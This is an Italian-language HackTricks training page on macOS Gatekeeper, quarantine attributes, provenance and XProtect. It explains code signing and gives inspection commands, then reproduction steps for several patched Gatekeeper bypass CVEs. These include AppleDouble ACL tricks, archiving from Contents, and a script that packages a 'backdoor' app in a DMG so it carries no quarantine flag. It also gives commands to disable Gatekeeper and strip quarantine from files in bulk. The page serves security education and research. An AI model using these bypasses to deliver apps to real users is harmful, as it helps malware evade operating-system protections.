# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}


## Gatekeeper

**Gatekeeper** è una funzionalità di sicurezza sviluppata per i sistemi operativi Mac, progettata per garantire che gli utenti **eseguano solo software considerato affidabile** sui propri sistemi. Funziona **convalidando il software** che un utente scarica e tenta di aprire da **fonti esterne all'App Store**, come un'app, un plug-in o un pacchetto di installazione.

Il meccanismo principale di Gatekeeper consiste nel processo di **verifica**. Controlla se il software è **firmato da uno sviluppatore riconosciuto**, garantendone l'autenticità. Inoltre, verifica che il software sia stato **notarizzato da Apple**, confermando che non contenga contenuti dannosi noti e che non sia stato manomesso dopo la notarizzazione.

Inoltre, Gatekeeper rafforza il controllo e la sicurezza dell'utente **chiedendo agli utenti di approvare l'apertura** del software scaricato per la prima volta. Questa protezione aiuta a impedire che gli utenti eseguano inavvertitamente codice eseguibile potenzialmente dannoso, scambiandolo per un file di dati innocuo.

### Firme delle applicazioni

Le firme delle applicazioni, note anche come firme del codice, sono una componente fondamentale dell'infrastruttura di sicurezza di Apple. Vengono utilizzate per **verificare l'identità dell'autore del software** (lo sviluppatore) e per garantire che il codice non sia stato manomesso dall'ultima volta in cui è stato firmato.

Ecco come funziona:

1. **Firma dell'applicazione:** quando uno sviluppatore è pronto a distribuire la propria applicazione, **firma l'applicazione utilizzando una chiave privata**. Questa chiave privata è associata a un **certificato che Apple rilascia allo sviluppatore** quando si iscrive all'Apple Developer Program. Il processo di firma consiste nella creazione di un hash crittografico di tutte le parti dell'app e nella cifratura di questo hash con la chiave privata dello sviluppatore.
2. **Distribuzione dell'applicazione:** l'applicazione firmata viene quindi distribuita agli utenti insieme al certificato dello sviluppatore, che contiene la chiave pubblica corrispondente.
3. **Verifica dell'applicazione:** quando un utente scarica e tenta di eseguire l'applicazione, il sistema operativo del Mac utilizza la chiave pubblica contenuta nel certificato dello sviluppatore per decifrare l'hash. Ricalcola quindi l'hash in base allo stato attuale dell'applicazione e lo confronta con l'hash decifrato. Se corrispondono, significa che **l'applicazione non è stata modificata** da quando lo sviluppatore l'ha firmata, e il sistema consente l'esecuzione dell'applicazione.

Le firme delle applicazioni sono una parte essenziale della tecnologia Gatekeeper di Apple. Quando un utente tenta di **aprire un'applicazione scaricata da Internet**, Gatekeeper verifica la firma dell'applicazione. Se questa è firmata con un certificato rilasciato da Apple a uno sviluppatore noto e il codice non è stato manomesso, Gatekeeper consente l'esecuzione dell'applicazione. In caso contrario, blocca l'applicazione e avvisa l'utente.

A partire da macOS Catalina, **Gatekeeper verifica anche se l'applicazione è stata notarizzata** da Apple, aggiungendo un ulteriore livello di sicurezza. Il processo di notarizzazione controlla l'applicazione alla ricerca di problemi di sicurezza noti e codice dannoso e, se questi controlli vengono superati, Apple aggiunge all'applicazione un ticket che Gatekeeper può verificare.

#### Verifica delle firme

Quando si controlla un **malware sample**, è sempre opportuno **verificare la firma** del binary, poiché lo **sviluppatore** che lo ha firmato potrebbe essere già **collegato** a del **malware.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarizzazione

Il processo di notarizzazione di Apple funge da ulteriore protezione per difendere gli utenti da software potenzialmente dannoso. Prevede che lo **sviluppatore invii la propria applicazione per l'esame** da parte dell'**Apple's Notary Service**, che non deve essere confuso con App Review. Questo servizio è un **sistema automatizzato** che esamina il software inviato per verificare la presenza di **contenuti dannosi** e di eventuali problemi relativi alla code-signing.

Se il software **supera** questa ispezione senza sollevare dubbi, il Notary Service genera un ticket di notarizzazione. Lo sviluppatore deve quindi **allegare questo ticket al proprio software**, un processo noto come "stapling". Inoltre, il ticket di notarizzazione viene pubblicato online, dove Gatekeeper, la tecnologia di sicurezza di Apple, può accedervi.

Durante la prima installazione o esecuzione del software da parte dell'utente, l'esistenza del ticket di notarizzazione, sia esso allegato all'eseguibile o reperito online, **informa Gatekeeper che il software è stato sottoposto a notarizzazione da parte di Apple**. Di conseguenza, Gatekeeper visualizza un messaggio descrittivo nella finestra di dialogo del primo avvio, indicando che Apple ha sottoposto il software a controlli per verificare la presenza di contenuti dannosi. Questo processo aumenta quindi la fiducia degli utenti nella sicurezza del software che installano o eseguono sui propri sistemi.

### spctl e syspolicyd

> [!CAUTION]
> Nota che, a partire dalla versione Sequoia, **`spctl`** non consente più di modificare la configurazione di Gatekeeper.

**`spctl`** è lo strumento CLI per enumerare e interagire con Gatekeeper (con il daemon `syspolicyd` tramite messaggi XPC). Ad esempio, è possibile visualizzare lo **stato** di GateKeeper con:
```bash
# Check the status
spctl --status
```
> [!CAUTION]
> Tieni presente che i controlli della firma di GateKeeper vengono eseguiti solo sui **file con l'attributo Quarantine**, non su ogni file.

GateKeeper verificherà se, in base alle **preferenze e alla firma**, un binary può essere eseguito:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** è il daemon principale responsabile dell'applicazione di Gatekeeper. Mantiene un database situato in `/var/db/SystemPolicy` ed è possibile trovare il codice di supporto per il [database qui](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp) e il [template SQL qui](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql). Tieni presente che il database non è soggetto alle restrizioni di SIP ed è scrivibile da root; il database `/var/db/.SystemPolicy-default` viene utilizzato come backup originale nel caso in cui l'altro database venga danneggiato.

Inoltre, i bundle **`/var/db/gke.bundle`** e **`/var/db/gkopaque.bundle`** contengono file con regole che vengono inserite nel database. Puoi controllare questo database come root con:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** espone anche un server XPC con diverse operazioni come `assess`, `update`, `record` e `cancel`, raggiungibili anche tramite le API **`SecAssessment*`** di **`Security.framework`**; inoltre, **`spctl`** comunica effettivamente con **`syspolicyd`** tramite XPC.

Nota come la prima regola termini con "**App Store**" e la seconda con "**Developer ID**", e che nell'immagine precedente fosse **abilitata l'esecuzione di app provenienti dall'App Store e da sviluppatori identificati**.\
Se **modifichi** tale impostazione in App Store, le regole "**Notarized Developer ID**" scompariranno.

Esistono inoltre migliaia di regole di **tipo GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Questi sono gli hash ricavati da:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Oppure puoi elencare le informazioni precedenti con:
```bash
sudo spctl --list
```
Le opzioni **`--master-disable`** e **`--global-disable`** di **`spctl`** **disabiliteranno completamente** questi controlli delle firme:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Quando completamente abilitata, apparirà una nuova opzione:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

È possibile **verificare se un'App sarà consentita da GateKeeper** con:
```bash
spctl --assess -v /Applications/App.app
```
È possibile aggiungere nuove regole in GateKeeper per consentire l'esecuzione di determinate app con:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Per quanto riguarda le **kernel extensions**, la cartella `/var/db/SystemPolicyConfiguration` contiene file con elenchi delle kext autorizzate al caricamento. Inoltre, `spctl` dispone dell’entitlement `com.apple.private.iokit.nvram-csr` perché è in grado di aggiungere nuove kernel extensions pre-approvate, che devono essere salvate anche nella NVRAM in una chiave `kext-allowed-teams`.

#### Gestione di Gatekeeper su macOS 15 (Sequoia) e versioni successive

- Il bypass di lunga data tramite **Ctrl+Open / clic destro → Open** nel Finder è stato rimosso; dopo la prima finestra di dialogo relativa al blocco, gli utenti devono consentire esplicitamente l’app bloccata da **Impostazioni di Sistema → Privacy e sicurezza → Apri comunque**.<sup>[[4]](#references)</sup>
- `spctl --master-disable/--global-disable` non sono più accettati; `spctl` è di fatto in modalità sola lettura per la valutazione e la gestione delle etichette, mentre l’applicazione dei criteri viene configurata tramite l’interfaccia utente o MDM.

A partire da macOS 15 Sequoia, gli utenti finali non possono più modificare i criteri di Gatekeeper da `spctl`. La gestione viene eseguita tramite Impostazioni di Sistema oppure distribuendo un configuration profile MDM con il payload `com.apple.systempolicy.control`. Esempio di snippet di profilo per consentire l’App Store e gli sviluppatori identificati, ma non "Anywhere":

<details>
<summary>Profilo MDM per consentire l’App Store e gli sviluppatori identificati</summary>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>PayloadContent</key>
<array>
<dict>
<key>PayloadType</key>
<string>com.apple.systempolicy.control</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadIdentifier</key>
<string>com.example.gatekeeper</string>
<key>EnableAssessment</key>
<true/>
<key>AllowIdentifiedDevelopers</key>
<true/>
</dict>
</array>
<key>PayloadType</key>
<string>Configuration</string>
<key>PayloadIdentifier</key>
<string>com.example.profile.gatekeeper</string>
<key>PayloadUUID</key>
<string>00000000-0000-0000-0000-000000000000</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadDisplayName</key>
<string>Gatekeeper</string>
</dict>
</plist>
```
</details>

### File in quarantena

Quando si **scarica** un'applicazione o un file, alcune **applicazioni** macOS, come i browser web o i client di posta elettronica, **associano un attributo file esteso**, comunemente noto come "**quarantine flag**", al file scaricato. Questo attributo funge da misura di sicurezza per **contrassegnare il file** come proveniente da una fonte non attendibile (Internet) e potenzialmente rischiosa. Tuttavia, non tutte le applicazioni associano questo attributo; ad esempio, i comuni client software BitTorrent solitamente aggirano questo processo.

**La presenza di un quarantine flag segnala la funzionalità di sicurezza Gatekeeper di macOS quando un utente tenta di eseguire il file**.

Nel caso in cui il **quarantine flag non sia presente** (come nel caso dei file scaricati tramite alcuni client BitTorrent), i **controlli di Gatekeeper potrebbero non essere eseguiti**. Pertanto, gli utenti dovrebbero prestare attenzione quando aprono file scaricati da fonti meno sicure o sconosciute.

> [!NOTE] > **La verifica** della **validità** delle firme del codice è un processo **dispendioso in termini di risorse**, che include la generazione di **hash crittografici** del codice e di tutte le risorse incluse. Inoltre, la verifica della validità del certificato implica un **controllo online** sui server Apple per verificare se il certificato sia stato revocato dopo il rilascio. Per questi motivi, eseguire un controllo completo della firma del codice e della notarizzazione **ogni volta che viene avviata un'app** non è **praticabile**.
>
> Pertanto, questi controlli vengono eseguiti **solo quando si eseguono app con l'attributo quarantined**.

> [!WARNING]
> Questo attributo deve essere **impostato dall'applicazione che crea/scarica** il file.
>
> Tuttavia, i file sottoposti a sandbox avranno questo attributo impostato per ogni file che creano. Inoltre, le app non sottoposte a sandbox possono impostarlo autonomamente oppure specificare la chiave [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) nell'**Info.plist**, facendo sì che il sistema imposti l'attributo esteso `com.apple.quarantine` sui file creati,

Inoltre, tutti i file creati da un processo che chiama **`qtn_proc_apply_to_self`** vengono messi in quarantena. Oppure, l'API **`qtn_file_apply_to_path`** aggiunge l'attributo di quarantena a un percorso file specificato.

È possibile **verificarne lo stato e abilitarlo/disabilitarlo** (è necessario disporre dei privilegi root) con:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Puoi anche **verificare se un file dispone dell'attributo esteso `quarantine`** con:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Controlla il **valore** degli **attributi** **estesi** e scopri l'app che ha scritto l'attributo di quarantena con:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- The user has been allowed to execute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
In realtà, un processo "potrebbe impostare i quarantine flags sui file che crea" (ho già provato ad applicare il flag USER_APPROVED a un file creato, ma non viene applicato):

<details>

<summary>Codice sorgente per applicare i quarantine flags</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

E **rimuovi** quell'attributo con:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
E trova tutti i file in quarantena con:
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
Le informazioni sulla quarantine sono memorizzate anche in un database centrale gestito da LaunchServices in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**, che consente alla GUI di ottenere dati sull'origine dei file. Inoltre, questo può essere sovrascritto dalle applicazioni che potrebbero essere interessate a nasconderne l'origine. Inoltre, ciò può essere fatto tramite le API di LaunchServices.

#### **libquarantine.dylib**

Questa library esporta diverse funzioni che consentono di manipolare i campi degli extended attribute.

Le API `qtn_file_*` gestiscono le policy di quarantine dei file, mentre le API `qtn_proc_*` vengono applicate ai processi (file creati dal processo). Le funzioni non esportate `__qtn_syscall_quarantine*` sono quelle che applicano le policy e chiamano `mac_syscall` con "Quarantine" come primo argomento, inviando le richieste a `Quarantine.kext`.

#### **Quarantine.kext**

La kernel extension è disponibile solo tramite la **kernel cache sul sistema**; tuttavia, è possibile _scaricare il **Kernel Debug Kit da** [**https://developer.apple.com/**](https://developer.apple.com/), che conterrà una versione symbolicated dell'estensione.

Questo Kext utilizza MACF per intercettare diverse chiamate al fine di intercettare tutti gli eventi del ciclo di vita dei file: creazione, apertura, ridenominazione, hard-linkning... persino `setxattr`, per impedirgli di impostare l'extended attribute `com.apple.quarantine`.

Utilizza inoltre un paio di MIB:

- `security.mac.qtn.sandbox_enforce`: applica la quarantine insieme alla Sandbox
- `security.mac.qtn.user_approved_exec`: i processi in quarantine possono eseguire solo file approvati

#### Provenance xattr (Ventura e versioni successive)

macOS 13 Ventura ha introdotto un meccanismo di provenance separato, che viene popolato la prima volta che un'applicazione in quarantine viene autorizzata all'esecuzione.<sup>[[2]](#references)</sup> Vengono creati due artefatti:

- L'xattr `com.apple.provenance` sulla directory del bundle `.app` (un valore binario di dimensione fissa contenente una primary key e dei flag).
- Una riga nella tabella `provenance_tracking` all'interno del database ExecPolicy in `/var/db/SystemPolicyConfiguration/ExecPolicy/`, che memorizza il cdhash e i metadati dell'app.

Uso pratico:
```bash
# Inspect provenance xattr (if present)
xattr -p com.apple.provenance /Applications/Some.app | hexdump -C

# Observe Gatekeeper/provenance events in real time
log stream --style syslog --predicate 'process == "syspolicyd"'

# Retrieve historical Gatekeeper decisions for a specific bundle
log show --last 2d --style syslog --predicate 'process == "syspolicyd" && eventMessage CONTAINS[cd] "GK scan"'
```
### XProtect

XProtect è una funzionalità **anti-malware** integrata in macOS. XProtect **controlla ogni applicazione al primo avvio o quando viene modificata, confrontandola con il proprio database** di malware noti e tipi di file non sicuri. Quando scarichi un file tramite determinate app, come Safari, Mail o Messages, XProtect esegue automaticamente la scansione del file. Se corrisponde a un malware noto presente nel database, XProtect **impedisce l'esecuzione del file** e ti avvisa della minaccia.

Il database di XProtect viene **aggiornato regolarmente** da Apple con nuove definizioni di malware, e questi aggiornamenti vengono scaricati e installati automaticamente sul Mac. Questo garantisce che XProtect sia sempre aggiornato con le minacce note più recenti.

Tuttavia, è importante notare che **XProtect non è una soluzione antivirus completa**. Controlla solo un elenco specifico di minacce note e non esegue la scansione on-access come la maggior parte dei software antivirus.

Puoi ottenere informazioni sull'ultimo aggiornamento di XProtect eseguendo:
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
XProtect si trova in una posizione protetta da SIP, in **/Library/Apple/System/Library/CoreServices/XProtect.bundle**, e all'interno del bundle è possibile trovare le informazioni utilizzate da XProtect:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: consente al code con quegli cdhash di utilizzare i legacy entitlements.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: elenco di plugin ed extensions il cui caricamento è vietato tramite BundleID e TeamID, oppure che indica una versione minima.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: regole Yara per rilevare malware.
- **`XProtect.bundle/Contents/Resources/gk.db`**: database SQLite3 con gli hash delle applicazioni bloccate e dei TeamID.

Nota che esiste un'altra App in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** correlata a XProtect, ma che non è coinvolta nel processo di Gatekeeper.

> XProtect Remediator: nelle versioni moderne di macOS, Apple distribuisce scanner on-demand (XProtect Remediator) che vengono eseguiti periodicamente tramite launchd per rilevare e rimediare alle famiglie di malware. È possibile osservare queste scansioni nei unified logs:
>
> ```bash
> log show --last 2h --predicate 'subsystem == "com.apple.XProtectFramework" || category CONTAINS "XProtect"' --style syslog
> ```

### Non Gatekeeper

> [!CAUTION]
> Nota che Gatekeeper **non viene eseguito ogni volta** che esegui un'applicazione; solo _**AppleMobileFileIntegrity**_ (AMFI) **verifica le firme del codice eseguibile** quando esegui un'app già eseguita e verificata da Gatekeeper.

In precedenza era quindi possibile eseguire un'app per memorizzarla nella cache di Gatekeeper, quindi **modificare i file non eseguibili dell'applicazione** (come i file Electron asar o NIB) e, se non erano presenti altre protezioni, l'applicazione veniva **eseguita** con le aggiunte **malevole**.

Tuttavia, ora questo non è più possibile perché macOS **impedisce di modificare i file** all'interno dei bundle delle applicazioni. Pertanto, se provi l'attacco [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), scoprirai che non è più possibile abusarne perché, dopo aver eseguito l'app per memorizzarla nella cache di Gatekeeper, non potrai modificare il bundle. Inoltre, se cambi, ad esempio, il nome della directory Contents in NotCon (come indicato nell'exploit) e poi esegui il binario principale dell'app per memorizzarla nella cache di Gatekeeper, verrà generato un errore e l'app non verrà eseguita.

## Gatekeeper Bypasses

Qualsiasi metodo per bypassare Gatekeeper (riuscire a fare in modo che l'utente scarichi ed esegua qualcosa quando Gatekeeper dovrebbe impedirlo) è considerato una vulnerabilità in macOS. Questi sono alcuni CVE assegnati a tecniche che in passato consentivano di bypassare Gatekeeper:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

È stato osservato che, se per l'estrazione viene utilizzata **Archive Utility**, ai file con **percorsi di oltre 886 caratteri** non viene assegnato l'attributo esteso com.apple.quarantine. Questa situazione consente inavvertitamente a tali file di **eludere i controlli di sicurezza di Gatekeeper**.<sup>[[5]](#references)</sup>

Consulta il [**report originale**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) per ulteriori informazioni.<sup>[[5]](#references)</sup>

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Quando un'applicazione viene creata con **Automator**, le informazioni su ciò che deve eseguire si trovano all'interno di `application.app/Contents/document.wflow`, non nell'eseguibile. L'eseguibile è solo un binario Automator generico chiamato **Automator Application Stub**.

Pertanto, era possibile fare in modo che `application.app/Contents/MacOS/Automator\ Application\ Stub` **puntasse tramite un symbolic link a un altro Automator Application Stub presente nel sistema**; in questo modo avrebbe eseguito ciò che si trova in `document.wflow` (il tuo script) **senza attivare Gatekeeper**, perché l'eseguibile effettivo non aveva l'xattr quarantine.<sup>[[6]](#references)</sup>

Posizione prevista nell'esempio: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Consulta il [**report originale**](https://ronmasas.com/posts/bypass-macos-gatekeeper) per ulteriori informazioni.<sup>[[6]](#references)</sup>

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

In questo bypass, un file zip veniva creato iniziando la compressione da `application.app/Contents` invece che da `application.app`. Pertanto, l'attributo **quarantine** veniva applicato a tutti i **file di `application.app/Contents`**, ma **non a `application.app`**, che era ciò che Gatekeeper controllava. Di conseguenza, Gatekeeper veniva bypassato perché, quando `application.app` veniva attivata, **non aveva l'attributo quarantine.**<sup>[[7]](#references)</sup>
```bash
zip -r test.app/Contents test.zip
```
Controlla il [**report originale**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) per ulteriori informazioni.<sup>[[7]](#references)</sup>

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Anche se i componenti sono diversi, lo sfruttamento di questa vulnerabilità è molto simile a quello precedente. In questo caso genereremo un Apple Archive da **`application.app/Contents`**, quindi **`application.app` non riceverà l'attributo quarantine** quando verrà decompresso da **Archive Utility**.<sup>[[8]](#references)</sup>
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Consulta il [**report originale**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) per ulteriori informazioni.<sup>[[8]](#references)</sup>

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

L'ACL **`writeextattr`** può essere utilizzata per impedire a chiunque di scrivere un attributo in un file:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Inoltre, il formato di file **AppleDouble** copia un file, inclusi i relativi ACE.<sup>[[9]](#references)</sup>

Nel [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale dell'ACL memorizzata all'interno dell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se comprimi un'applicazione in un file zip con il formato **AppleDouble**, utilizzando un ACL che impedisce la scrittura di altri xattr al suo interno... l'xattr di quarantena non veniva impostato nell'applicazione:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
Consulta il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) per ulteriori informazioni.<sup>[[9]](#references)</sup>

Nota che questo potrebbe essere sfruttato anche con AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

È stato scoperto che **Google Chrome non impostava l'attributo quarantine** sui file scaricati a causa di alcuni problemi interni di macOS.<sup>[[10]](#references)</sup>

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble memorizza gli attributi di un file in un file separato il cui nome inizia con `._`; questo aiuta a copiare gli attributi dei file **tra computer macOS**. Tuttavia, dopo la decompressione di un file AppleDouble, al file che iniziava con `._` **non veniva assegnato l'attributo quarantine**.<sup>[[11]](#references)</sup>
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you download and decompress the resulting test.aar, test/._a won't have a quarantine attribute
```
Potendo creare un file a cui non veniva impostato l'attributo **quarantine**, era **possibile bypassare Gatekeeper**. Il trucco consisteva nel **creare un'applicazione in un file DMG** usando la convenzione dei nomi AppleDouble (facendolo iniziare con `._`) e creare un **file visibile come sym link a questo** file nascosto senza l'attributo quarantine.\
Quando il **file dmg viene eseguito**, poiché non dispone di un attributo quarantine, **bypassa Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### [CVE-2023-41067]

Un bypass di Gatekeeper corretto in macOS Sonoma 14.0 consentiva l'esecuzione di app manipolate senza mostrare alcuna richiesta. I dettagli sono stati divulgati pubblicamente dopo la distribuzione della patch e il problema era attivamente sfruttato in the wild prima della correzione. Assicurarsi che sia installato Sonoma 14.0 o una versione successiva.<sup>[[13]](#references)</sup>

### [CVE-2024-27853]

Un bypass di Gatekeeper in macOS 14.4 (rilasciato a marzo 2024), derivante dalla gestione di ZIP malevoli da parte di `libarchive`, consentiva alle app di eludere la valutazione. Aggiornare alla versione 14.4 o successiva, in cui Apple ha risolto il problema.<sup>[[1]](#references)</sup>

### [CVE-2024-44128](https://support.apple.com/en-us/121234)

Un **Automator Quick Action workflow** incorporato in un'app scaricata poteva essere attivato senza la valutazione di Gatekeeper, perché i workflow venivano trattati come dati ed eseguiti dall'helper di Automator al di fuori del normale percorso della richiesta di notarizzazione. Un `.app` manipolato che includeva una Quick Action in grado di eseguire uno shell script (ad esempio, all'interno di `Contents/PlugIns/*.workflow/Contents/document.wflow`) poteva quindi essere eseguito immediatamente all'avvio. Apple ha aggiunto una richiesta di consenso aggiuntiva e corretto il percorso di valutazione in Ventura **13.7**, Sonoma **14.7** e Sequoia **15**.<sup>[[3]](#references)</sup>

### Strumenti di decompressione di terze parti che propagano erroneamente la quarantena (2023–2024)

Diverse vulnerabilità presenti in strumenti di estrazione diffusi (ad esempio The Unarchiver) causavano la perdita dell'xattr `com.apple.quarantine` per i file estratti dagli archivi, creando opportunità di bypass di Gatekeeper. Durante i test, affidarsi sempre a macOS Archive Utility o a strumenti aggiornati e verificare gli xattr dopo l'estrazione.

